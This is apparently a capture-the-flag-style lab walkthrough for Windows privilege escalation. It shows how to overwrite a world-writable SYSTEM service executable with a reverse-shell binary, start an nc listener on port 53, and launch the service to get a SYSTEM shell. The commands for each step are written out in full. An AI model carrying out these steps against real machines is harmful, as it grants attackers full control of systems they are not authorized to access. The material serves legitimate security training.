# ğŸ¾ Task 6: Exploiting Services - Unsecured Service Executables
---

## ğŸ“œ Task Description
In this task, we will exploit a vulnerability in the `filepermsvc` service, which runs with SYSTEM privileges. The vulnerability lies in the service executable being writable by all users, allowing us to replace it with our custom file and obtain a reverse shell with SYSTEM privileges.

---

## ğŸ” Step 1: Checking Service Configuration
First, check the configuration of the `filepermsvc` service to confirm it runs with SYSTEM privileges. Execute the following command:  
`sc.exe qc filepermsvc`

### ğŸ“‹ Expected Output
- Ensure that the `SERVICE_START_NAME` indicates SYSTEM.  
![image](https://github.com/user-attachments/assets/eeb8e281-a588-4d9a-b3fc-ad968d7c8782)

---

## ğŸ”‘ Step 2: Checking Permissions on the Executable
Now, use the `accesschk.exe` tool to verify write permissions on the executable for the `filepermsvc` service. Execute the following command:  
`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

### ğŸ“‹ Expected Output
- Confirm that the executable `filepermservice.exe` is writable by all users.  
![image](https://github.com/user-attachments/assets/7005e051-598d-4c39-ad9c-c4e6d97d1842)

---

## ğŸ“ Step 3: Replacing the Executable
Replace the `filepermservice.exe` executable with your previously created `reverse.exe`. Run the following command:  
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" -Force`

### ğŸ“‹ Expected Output
- Confirm that the executable has been successfully replaced with `reverse.exe`.

---

## ğŸ§ Step 4: Setting Up the Listener
Before starting the service, ensure you have a listener running on Kali. Use the following command to start the listener:  
`nc -lvnp 53`

---

## ğŸš€ Step 5: Starting the Service
Now, start the `filepermsvc` service. It should execute `reverse.exe` and provide you with a reverse shell with SYSTEM privileges. Execute the following command:  
`net start filepermsvc`

### ğŸ“‹ Expected Output
- Confirm that you have received a reverse shell on Kali.  
![image](https://github.com/user-attachments/assets/de67780f-f3db-4052-8f91-636881ae5068)

---

## ğŸ‰ Congratulations!
You have successfully exploited an unsecured service executable to gain a reverse shell with SYSTEM privileges! ğŸŠ

---

## ğŸ“Œ Notes
- Ensure you understand all the steps and their implications.
- Use this knowledge responsibly and only within authorized penetration testing engagements.
